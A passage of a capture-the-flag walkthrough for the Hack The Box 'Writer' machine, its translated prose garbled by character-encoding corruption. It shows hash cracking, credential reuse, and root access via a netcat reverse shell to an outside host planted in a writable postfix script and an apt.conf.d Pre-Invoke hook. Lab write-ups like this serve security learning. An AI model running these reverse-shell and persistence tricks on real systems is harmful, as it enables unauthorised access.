python3<br/>/usr/bin/python3<br/><br/>www-data@writer:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>python3 -c 'import pty;pty.spawn("/bin/bash")'<br/><br/>www-data@writer:/$ ^Z<br/>zsh: suspended  nc -nlvp 1337<br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 1337<br/><br/>www-data@writer:/$ export TERM=xterm<br/>www-data@writer:/$ stty rows 52 cols 237</span></pre><p id="ff70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç¯é¡¾å››å‘¨ï¼Œæˆ‘åœ¨/etcä¸­æ‰¾åˆ°äº†ä¸€ä¸ªMySQLæ–‡ä»¶å¤¹:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="59a8" class="nc km iq my b gy nd ne l nf ng">www-data@writer:/etc/mysql$ ls -lsa<br/>4 drwxr-xr-x   2 root root 4096 May 18 15:51 conf.d<br/>4 -rwxr-xr-x   1 root root 1620 May  9 18:20 debian-start<br/>4 -rw-------   1 root root  261 May 18 15:51 debian.cnf<br/>4 -rw-r--r--   1 root root  972 May 19 12:34 mariadb.cnf<br/>4 drwxr-xr-x   2 root root 4096 May 18 15:51 mariadb.conf.d<br/>0 lrwxrwxrwx   1 root root   24 May 18 15:51 my.cnf -&gt; /etc/alternatives/my.cnf<br/><br/>www-data@writer:/etc/mysql$ cat my.cnf<br/>&lt;SNIP&gt;<br/><br/>[client]<br/>database = dev<br/>user = djangouser<br/>password = &lt;HIDDEN&gt;<br/>default-character-set = utf8</span></pre><h1 id="9af4" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">MySQLæšä¸¾</h1><p id="5199" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä½¿ç”¨credsæšä¸¾MySQLæœåŠ¡å™¨æ¥æŸ¥æ‰¾ç”¨æˆ·æ•£åˆ—:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ns"><img src="../Images/4304f715f28e1febc90f93dc587d2150.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yh7HJonN9-WBPiEDBNtjcg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">MySQLæ•°æ®åº“æšä¸¾</figcaption></figure><h1 id="e501" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">å“ˆå¸Œå¡ç‰¹</h1><p id="9e48" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">è®©æˆ‘ä»¬æ¥ç ´è§£å®ƒ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nt"><img src="../Images/9ba2c869a26626e7c63d98d88f8a76f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pz79IQsVAMUNM8nekfQbWg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">å“ˆå¸Œæ ‡è¯†å®ƒçš„åç§°</figcaption></figure><p id="afff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¯åŠ¨hashcatå’Œrockyou:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="93b7" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 10000        <br/>hashcat (v6.1.1) starting...<br/><br/>Dictionary cache built:<br/>* Filename..: /usr/share/wordlists/rockyou.txt<br/>* Passwords.: 14344392<br/>* Bytes.....: 139921507<br/>* Keyspace..: 14344385<br/>* Runtime...: 1 sec<br/><br/>&lt;HIDDEN&gt;<br/>                                                 <br/>Session..........: hashcat<br/>Status...........: Cracked<br/>Hash.Name........: Django (PBKDF2-SHA256)<br/>Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=<br/>Time.Started.....: Thu Oct 14 22:06:04 2021 (1 min, 5 secs)<br/>Time.Estimated...: Thu Oct 14 22:07:09 2021 (0 secs)<br/>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br/>Guess.Queue......: 1/1 (100.00%)<br/>Speed.#1.........:      157 H/s (18.67ms) @ Accel:256 Loops:512 Thr:1 Vec:8<br/>Recovered........: 1/1 (100.00%) Digests<br/>Progress.........: 10240/14344385 (0.07%)<br/>Rejected.........: 0/10240 (0.00%)<br/>Restore.Point....: 9216/14344385 (0.06%)<br/>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259584-259999<br/>Candidates.#1....: rubberducky -&gt; 1asshole<br/><br/>Started: Thu Oct 14 22:04:54 2021<br/>Stopped: Thu Oct 14 22:07:09 2021</span></pre><p id="99bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å‡ åˆ†é’Ÿåæˆ‘ä»¬å¾—åˆ°äº†å‡¯å°”çš„å¯†ç ã€‚</p><h1 id="7f35" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">å®¹æ˜“çš„é“è·¯</h1><p id="24da" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬ä¸éœ€è¦è´¹é‚£ä¹ˆå¤§åŠ›æ°”å»è·å–å‡¯å°”çš„å¯†ç ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å¼ºè¡Œç ´è§£ã€‚ä¸‹é¢æ˜¯æˆ‘åœ¨æ¼”ç»ƒå¼€å§‹æ—¶è®¾ç½®Hydraçš„æƒ…å†µ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nu"><img src="../Images/e55c6bdd0c3ec695aa847fa7587aed75.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WlAtlmGPcGoUSga1fPWY0w.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ä¹å¤´è›‡SSHå¯†ç ç ´è§£</figcaption></figure><h1 id="9270" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ°´è…</h1><p id="735b" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æ˜¯çš„ï¼Œ20åˆ†é’Ÿåï¼Œå®ƒè®©æˆ‘åˆ°è¾¾äº†é¢„å®šè·¯å¾„ä¸Šæ‰€æœ‰å·¥ä½œçš„åŒä¸€ç‚¹ï¼å½“ç„¶ï¼Œæˆ‘ä»¬æ˜¯æ¥å­¦ä¹ çš„ï¼Œæ‰€ä»¥å¸Œæœ›ä½ ç”¨äº†æ­£ç¡®çš„æ–¹æ³•ã€‚</p><h1 id="e1fc" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ç”¨æˆ·Kyleè®¿é—®</h1><p id="cd48" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æœ‰äº†Kyleçš„å¯†ç ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥é€šè¿‡SSHç™»å½•:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f30d" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# ssh kyle@writer.htb        <br/>ECDSA key fingerprint is SHA256:GX5VjVDTWG6hUw9+T11QNDaoU0z5z9ENmryyyroNIBI.<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>Warning: Permanently added 'writer.htb,10.10.11.101' (ECDSA) to the list of known hosts.<br/>kyle@writer.htb's password: <br/>Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)<br/><br/>Last login: Mon Oct 11 15:31:14 2021 from 10.10.14.202<br/>kyle@writer:~$</span></pre><p id="dd71" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å…ˆæŠ¢æ——:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="7e2f" class="nc km iq my b gy nd ne l nf ng">kyle@writer:~$ cat user.txt <br/>&lt;HIDDEN&gt;</span></pre><p id="1f5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æ£€æŸ¥ç”¨æˆ·ï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªåä¸ºè¿‡æ»¤å™¨çš„ç»„:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="07c4" class="nc km iq my b gy nd ne l nf ng">kyle@writer:~$ id<br/>uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)</span></pre><h1 id="aa93" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆ©ç”¨åç¼€</h1><p id="ee6a" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥æœç´¢è¯¥ç»„å¯ä»¥è®¿é—®å“ªäº›æ–‡ä»¶:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="520b" class="nc km iq my b gy nd ne l nf ng">kyle@writer:~$ find / -group filter -type f 2&gt;/dev/null<br/>/etc/postfix/disclaimer<br/><br/>kyle@writer:~$ file /etc/postfix/disclaimer<br/>/etc/postfix/disclaimer: POSIX shell script, ASCII text executable<br/><br/>kyle@writer:~$ cat /etc/postfix/disclaimer<br/>#!/bin/sh<br/># Localize these.<br/>INSPECT_DIR=/var/spool/filter<br/>SENDMAIL=/usr/sbin/sendmail<br/><br/># Get disclaimer addresses<br/>DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses<br/><br/># Exit codes from &lt;sysexits.h&gt;<br/>EX_TEMPFAIL=75<br/>EX_UNAVAILABLE=69<br/>&lt;SNIP&gt;</span></pre><p id="b03d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¯¥æ–‡ä»¶ä¸Ubuntuçš„é»˜è®¤é‚®ä»¶ä¼ è¾“ä»£ç†<a class="ae nh" href="https://ubuntu.com/server/docs/mail-postfix" rel="noopener ugc nofollow" target="_blank">åç¼€</a>ä¸€èµ·ä½¿ç”¨ã€‚æˆ‘ä»¬å¯ä»¥å‡è®¾æˆ‘ä»¬çš„å‡çº§è·¯å¾„æ˜¯é€šè¿‡æ­¤æ–‡ä»¶ï¼Œå› ä¸ºå®ƒæ˜ç¡®å±äºæˆ‘ä»¬çš„ç”¨æˆ·æ‰€åœ¨çš„ç»„ã€‚è¿™é‡Œçš„ä¸€äº›èƒŒæ™¯é˜…è¯»<a class="ae nh" href="https://mobt3ath.com/uplode/books/book-27297.pdf" rel="noopener ugc nofollow" target="_blank">å¸®åŠ©æˆ‘ç†è§£äº†åç¼€å’Œå…è´£å£°æ˜æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚</a></p><p id="0306" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é¦–å…ˆï¼Œæˆ‘ä»¬æ£€æŸ¥postfixæ˜¯å¦æ­£åœ¨è¿è¡Œ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nv"><img src="../Images/d0fc21f798672e007f61708b61d9e185.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SDUvrPnFVgCLu19r8BOmag.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ä½¿ç”¨netstatæ£€æŸ¥è¿›ç¨‹</figcaption></figure><p id="f982" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å›å¤´çœ‹å…è´£å£°æ˜æ–‡ä»¶ï¼Œæˆ‘çœ‹åˆ°æ—¶é—´æˆ³æ­£åœ¨æ”¹å˜:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e2cb" class="nc km iq my b gy nd ne l nf ng">kyle@writer:/etc/postfix$ ls -l disclaimer<br/>-rwxrwxr-x 1 root filter  1021 Oct 14 22:04 disclaimer<br/><br/>kyle@writer:/etc/postfix$ ls -l<br/>-rwxrwxr-x 1 root filter  1101 Oct 14 22:08 disclaimer</span></pre><p id="7ec9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘è¯•ç€ç¼–è¾‘å…è´£å£°æ˜æ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­æ·»åŠ äº†ä¸€æ¡æ³¨é‡Šï¼Œè¿™æ¡æ³¨é‡Šåœ¨æ—¶é—´æˆ³æ›´æ–°æ—¶è¢«åˆ é™¤äº†ã€‚å› æ­¤ï¼Œè¿™è¯å®äº†æˆ‘ä»¬æœ‰ä¸€ä¸ªæœ‰é™çš„çª—å£æ¥æ›´æ”¹å…è´£å£°æ˜æ–‡ä»¶å¹¶å‘é€ç”µå­é‚®ä»¶æ¥è§¦å‘å®ƒçš„è¿è¡Œã€‚</p><p id="b3a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶æ˜¾ç¤ºäº†å°†å¯¹å…¶è¿è¡Œå…è´£å£°æ˜è„šæœ¬çš„åœ°å€:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="2ba9" class="nc km iq my b gy nd ne l nf ng">kyle@writer:/etc/postfix$ cat disclaimer_addresses<br/>root@writer.htb<br/>kyle@writer.htb</span></pre><p id="6e3c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae nh" href="https://baturorkun.medium.com/disclaimer-to-outgoing-emails-2ce576a6433b" rel="noopener">è¿™ç¯‡</a>æ–‡ç« è¯å®äº†å…è´£å£°æ˜è„šæœ¬å·²ç»è¢«æ›´æ”¹ä¸ºä½¿ç”¨addressesæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬éœ€è¦å‘/ä»å…¶ä¸­ä¸€ä¸ªåœ°å€å‘é€ç”µå­é‚®ä»¶æ¥è§¦å‘å®ƒã€‚</p><p id="04ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬éœ€è¦ä¸€ç§åœ¨æœºå™¨ä¸Šå‘é€æœ¬åœ°ç”µå­é‚®ä»¶çš„æ–¹æ³•ï¼Œå¿«é€Ÿæœç´¢å‘ç°äº†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨çš„RealPythonä¸Šçš„è¿™ä¸ªå‘é€é‚®ä»¶è„šæœ¬ã€‚</p><p id="41af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥åˆ å‡å¾ˆå¤šï¼Œä½¿ä¹‹æ›´ç®€å•ï¼Œåˆ›å»ºä¸€ä¸ªç©ºç™½æ–‡ä»¶:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="91ca" class="nc km iq my b gy nd ne l nf ng">kyle@writer:~$ nano /dev/shm/sendmail.py</span></pre><p id="b899" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å°†æˆ‘ä»¬çš„Pythonç‰ˆæœ¬ç²˜è´´åˆ°å…¶ä¸­å¹¶ä¿å­˜:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="561d" class="nc km iq my b gy nd ne l nf ng">import smtplib<br/><br/>try:<br/>    server = smtplib.SMTP('localhost')<br/>    server.sendmail('kyle@writer.htb', 'john@writer.htb', 'Shell Time!')<br/>    print("Mail sent")<br/>except error: <br/>    print("Mail failed to send")<br/>finally:<br/>    server.quit()</span></pre><p id="182f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨å°†å…è´£å£°æ˜æ–‡ä»¶å¤åˆ¶åˆ°/dev/shmå¹¶è¿›è¡Œç¼–è¾‘ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨å¼€å§‹æ—¶å°±æœ‰äº†åå‘shell:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3a88" class="nc km iq my b gy nd ne l nf ng">#!/bin/sh<br/># Localize these.<br/><br/>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.39 4444 &gt;/tmp/f<br/><br/>INSPECT_DIR=/var/spool/filter<br/>SENDMAIL=/usr/sbin/sendmail<br/><br/># Get disclaimer addresses<br/>DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses<br/>&lt;SNIP&gt;</span></pre><p id="8073" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦å°†ä¿®æ”¹åçš„å…è´£å£°æ˜æ–‡ä»¶å¤åˆ¶å›postfixæ–‡ä»¶å¤¹ï¼Œç„¶åé€šè¿‡å‘é€ç”µå­é‚®ä»¶æ¥è§¦å‘å®ƒ:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4f72" class="nc km iq my b gy nd ne l nf ng">kyle@writer:~$ cp /dev/shm/disclaimer /etc/postfix/disclaimer &amp;&amp; python3 /dev/shm/sendmail.py<br/>Mail sent</span></pre><h1 id="59ad" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ç”¨æˆ·John Access</h1><p id="8fde" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">åˆ‡æ¢åˆ°æˆ‘ä»¬çš„ç­‰å¾…netcatç›‘å¬å™¨ï¼ŒæŸ¥çœ‹æˆ‘ä»¬å·²ç»è¿æ¥äº†shell:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6a50" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# nc -nlvp 4444<br/>listening on [any] 4444 ...<br/>connect to [10.10.15.39] from (UNKNOWN) [10.10.11.101] 36350<br/>/bin/sh: 0: can't access tty; job control turned off<br/>$</span></pre><p id="1753" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®©æˆ‘ä»¬å››å¤„çœ‹çœ‹:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d03d" class="nc km iq my b gy nd ne l nf ng">$ whoami<br/>john<br/><br/>$ id<br/>uid=1001(john) gid=1001(john) groups=1001(john)<br/><br/>$ cd /home/john<br/>$ ls -la <br/>-rw-r--r-- 1 john john 3771 May 14 18:19 .bashrc<br/>drwx------ 2 john john 4096 Jul 28 09:19 .cache<br/>-rw-r--r-- 1 john john  807 May 14 18:19 .profile<br/>drwx------ 2 john john 4096 Jul  9 12:29 .ssh<br/><br/>$ ls -lsa .ssh<br/>4 -rw-r--r-- 1 john john  565 Jul  9 12:29 authorized_keys<br/>4 -rw------- 1 john john 2602 Jul  9 12:29 id_rsa<br/>4 -rw-r--r-- 1 john john  565 Jul  9 12:29 id_rsa.pub<br/><br/>$ cat .ssh/id_rsa<br/>-----BEGIN OPENSSH PRIVATE KEY-----<br/>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gt<br/>&lt;SNIP&gt;<br/>BwT0yAhKXBsBk18mx8roPS+wd9MTZ7XAUX6F2mZ9T12aIYQCajbzpd+fJ/N64NhIxRh5<br/>Nwy7uLkQ0cIY6XAAAAC2pvaG5Ad3JpdGVyAQIDBAUGBw==<br/>-----END OPENSSH PRIVATE KEY-----</span></pre><p id="750e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å‘ç°çº¦ç¿°æœ‰ä¸€ä¸ª. sshæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰ä»–çš„é’¥åŒ™ã€‚æˆ‘å°†å®ƒå¤åˆ¶åˆ°Kaliï¼Œå¹¶ä½¿ç”¨å®ƒæ¥SSHä»¥è·å¾—æ›´å¥½çš„shell:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="bba0" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# nano id_rsa  <br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# chmod 600 id_rsa<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# ssh -i id_rsa john@writer.htb<br/>Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)<br/><br/>Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19<br/>john@writer:~$</span></pre><p id="97d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬é€šè¿‡SSHè¿›å…¥ï¼Œæˆ‘ä»¬å¯ä»¥å†çœ‹ä¸€çœ‹:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="ae55" class="nc km iq my b gy nd ne l nf ng">john@writer:~$ id<br/>uid=1001(john) gid=1001(john) groups=1001(john),1003(management)</span></pre><h1 id="ec54" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆ©ç”¨aptã€‚ä¼šè®®æ–‡ä»¶</h1><p id="83b6" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Johnåœ¨ä¸€ä¸ªåä¸ºâ€œç®¡ç†â€çš„ç»„ä¸­ï¼Œå°±åƒæˆ‘ä»¬ä¸ºKyleæ‰€åšçš„é‚£æ ·ã€‚è®©æˆ‘ä»¬çœ‹çœ‹è¯¥ç»„æä¾›äº†å“ªäº›è®¿é—®æƒé™:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="fbca" class="nc km iq my b gy nd ne l nf ng">john@writer:~$ find / -group management 2&gt;/dev/null<br/>/etc/apt/apt.conf.d<br/><br/>john@writer:~$ ls -lsa /etc/apt<br/>total 36<br/>4 drwxr-xr-x   7 root root       4096 Jul  9 10:59 .<br/>4 drwxr-xr-x 102 root root       4096 Jul 28 06:32 ..<br/>4 drwxrwxr-x   2 root management 4096 Jul 28 09:24 apt.conf.d<br/>4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 auth.conf.d<br/>4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 preferences.d<br/>4 -rw-r--r--   1 root root       2777 May 13 21:57 sources.list<br/>4 -rw-r--r--   1 root root       2743 Feb  1  2021 sources.list.curt<br/>4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 sources.list.d<br/>4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 trusted.gpg.d</span></pre><p id="35f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬çœ‹åˆ°Johnæ‹¥æœ‰å¯¹è¯¥æ–‡ä»¶å¤¹çš„å†™æƒé™ã€‚å…³äºapt.conf.dæ–‡ä»¶å¤¹çš„ä¿¡æ¯æ¥è‡ª<a class="ae nh" href="https://debian-handbook.info/browse/wheezy/sect.apt-get.html" rel="noopener ugc nofollow" target="_blank">æ­¤å¤„</a>:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d9ef" class="nc km iq my b gy nd ne l nf ng">Each directory represents a configuration file which is split <br/>over multiple files. In this sense, all of the files in /etc/apt/apt.conf.d/ are instructions for the configuration of APT. APT includes them in alphabetical order, so that the last ones can modify a configuration element defined in one of the first ones.</span></pre><p id="6c34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™é‡Œæœ‰ä¸€ç¯‡å¾ˆå¥½çš„æ–‡ç« <a class="ae nh" href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation" rel="noopener ugc nofollow" target="_blank"/>è®²è¿°äº†æˆ‘ä»¬å¦‚ä½•ä½¿ç”¨æˆ‘ä»¬å¯¹é‚£ä¸ªæ–‡ä»¶å¤¹çš„æƒé™æ¥æ‰§è¡Œä»£ç ã€‚</p><p id="7da0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®©æˆ‘ä»¬åœ¨é‚£é‡Œåˆ›å»ºæˆ‘ä»¬è‡ªå·±çš„é…ç½®æ–‡ä»¶:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3e81" class="nc km iq my b gy nd ne l nf ng">john@writer:~$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.39 4444 &gt;/tmp/f"};' &gt; /etc/apt/apt.conf.d/rev_shell<br/><br/>john@writer:~$ ls -lsa /etc/apt/apt.conf.d/<br/>4 -rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove<br/>&lt;SNIP&gt;<br/>4 -rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier<br/>4 -rw-rw-r-- 1 john john        108 Oct 15 15:06 rev_shell</span></pre><h1 id="71f1" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ ¹æ ‡å¿—</h1><p id="19e1" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æ‰€ä»¥åœ¨ä¸Šé¢ï¼Œæˆ‘å°†ä¸€ä¸ªç®€å•çš„shellå›æ˜¾åˆ°åä¸ºrev_shellçš„æ–‡ä»¶ä¸­ã€‚è¿™å°†ç”±APTæœåŠ¡å¤„ç†ï¼Œæˆ‘ä»¬åªéœ€è¦æœ‰ä¸€ä¸ªNetcatä¾¦å¬å™¨ç­‰å¾…:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="094c" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# nc -nlvp 4444<br/>listening on [any] 4444 ...<br/>connect to [10.10.15.39] from (UNKNOWN) [10.10.11.101] 36708<br/>#</span></pre><p id="bd58" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">éšç€æˆ‘ä»¬çš„æœ€ç»ˆshellä½œä¸ºrootè¿æ¥ï¼Œæˆ‘ä»¬å¯ä»¥è·å–æ ‡å¿—:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d11a" class="nc km iq my b gy nd ne l nf ng"># id<br/>uid=0(root) gid=0(root) groups=0(root)<br/># cat /root/root.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="02b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å®Œæˆäº†ã€‚ä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl nw nx hu ny" role="separator"><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob"/></div><div class="ij ik il im in"><p id="01a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœä½ 